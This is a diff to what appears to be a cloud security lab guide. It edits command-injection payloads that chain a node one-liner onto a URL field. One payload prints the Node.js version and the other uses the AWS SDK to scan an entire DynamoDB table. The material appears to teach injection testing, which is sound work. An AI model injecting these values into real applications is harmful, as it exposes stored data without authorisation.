@@ -76,9 +76,9 @@ Return to the previous tab
 #### Node.js Access Enumeration
 Attempt to access content/information using Node.js  
 1. What version of node.js?  
-`https://; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log("Running Node.js" + process.version))})();'`
+`https://enum; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log("Running Node.js" + process.version))})();'`
 2. Can the database be scanned?  
-`https://; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'`
+`https://enum; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'`
 3. Can the database be queried?
 4. Does GetItem work?
 5. Does PutItem work?
